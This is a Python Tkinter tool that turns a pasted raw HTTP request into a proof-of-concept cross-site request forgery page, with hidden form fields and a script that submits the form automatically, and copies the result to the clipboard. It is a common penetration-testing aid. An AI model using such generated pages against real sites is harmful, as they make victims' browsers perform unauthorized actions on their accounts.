import urllib.parse
import tkinter as tk
from tkinter import messagebox, scrolledtext, IntVar
from airium import Airium
import pyperclip

def generate_csrf_poc(data, protocol):
    try:
        req_method = data.split(" ")[0]
        req_host = data.split("\n")[1].split(" ")[1]

        if req_method == 'GET':
            req_path = data.splitlines()[0].split(' ')[1].split('?')[0]
            req_body = data.splitlines()[0].split('?')[1].split('&')
            req_body[-1] = req_body[-1].split(' ')[0]
        else:
            req_path = data.split(" ")[1]
            req_body = data.splitlines()[-1].split('&')

        parameters = {item.split('=')[0]: item.split('=')[1] for item in req_body}
        req_url = protocol + "://" + req_host + req_path
    except IndexError:
        messagebox.showerror("Error", "Failed to parse the request. Please check the input format.")
        return

    a = Airium()

    with a.html():
        with a.body():
            if req_method == 'POST':
                with a.form(action=req_url, method=req_method):
                    for key, value in parameters.items():
                        value = urllib.parse.unquote(value)
                        a.input(type="hidden", name=key, value=value)
                    a.input(type='submit', value='Submit')
                with a.script():
                    a('document.forms[0].submit()')
            else:
                with a.form(action=req_url):
                    for key, value in parameters.items():
                        value = urllib.parse.unquote(value)
                        a.input(type="hidden", name=key, value=value)
                    a.input(type='submit', value='Submit')
                with a.script():
                    a('document.forms[0].submit()')

    html_output = str(a)
    return html_output

def generate_csrf_poc_gui():
    def generate_poc():
        input_data = text_input.get("1.0", "end-1c")
        protocol = "https" if https_var.get() == 1 else "http"

        if not input_data.strip():
            messagebox.showerror("Error", "Please paste the request data.")
            return

        html_output = generate_csrf_poc(input_data, protocol)
        text_output.delete("1.0", "end")
        text_output.insert("1.0", html_output)
        pyperclip.copy(html_output)

    # Create the main window
    window = tk.Tk()
    window.title("CSRF PoC Generator")
    
    # Set fixed window size
    window.geometry("800x800")
    window.resizable(False, False)  # Disable resizing
    
    # Frame for input
    frame_input = tk.Frame(window, bg='#f0f0f0', padx=20, pady=10)
    frame_input.pack(fill=tk.BOTH, expand=True)

    https_var = IntVar()
    https_checkbox = tk.Checkbutton(frame_input, text="HTTPS", variable=https_var, bg='#f0f0f0', font=('Arial', 12))
    https_checkbox.grid(row=0, column=0, padx=5, pady=5, sticky='w')

    label_data = tk.Label(frame_input, text="Paste Request Data:", bg='#f0f0f0', font=('Arial', 12))
    label_data.grid(row=1, column=0, padx=(5, 10), pady=5, sticky='w')

    text_input = scrolledtext.ScrolledText(frame_input, wrap=tk.WORD, width=80, height=10, font=('Arial', 12))
    text_input.grid(row=2, column=0, padx=5, pady=5, sticky="nsew")
    
    # Button to generate PoC
    button_generate = tk.Button(window, text="Generate PoC", command=generate_poc, bg='#4CAF50', fg='#fff', font=('Arial', 12), bd=0, padx=10, pady=5, cursor='hand2')
    button_generate.pack(pady=10)

    # Frame for output
    frame_output = tk.Frame(window, bg='#f0f0f0', padx=20, pady=10)
    frame_output.pack(fill=tk.BOTH, expand=True)

    label_output = tk.Label(frame_output, text="Generated CSRF PoC:", bg='#f0f0f0', font=('Arial', 12))
    label_output.pack(anchor='w', padx=(5, 10), pady=5)

    text_output = scrolledtext.ScrolledText(frame_output, wrap=tk.WORD, width=80, height=15, font=('Arial', 12))
    text_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    # Button to copy output
    def copy_output():
        output_text = text_output.get("1.0", "end-1c")
        if output_text.strip():
            pyperclip.copy(output_text)
            messagebox.showinfo("Copied", "Output copied to clipboard.")
        else:
            messagebox.showwarning("Empty Output", "No output to copy.")

    button_copy = tk.Button(window, text="Copy Output", command=copy_output, bg='#4CAF50', fg='#fff', font=('Arial', 12), bd=0, padx=10, pady=5, cursor='hand2')
    button_copy.pack(pady=10)

    # Start the Tkinter main loop
    window.mainloop()

if __name__ == "__main__":
    generate_csrf_poc_gui()
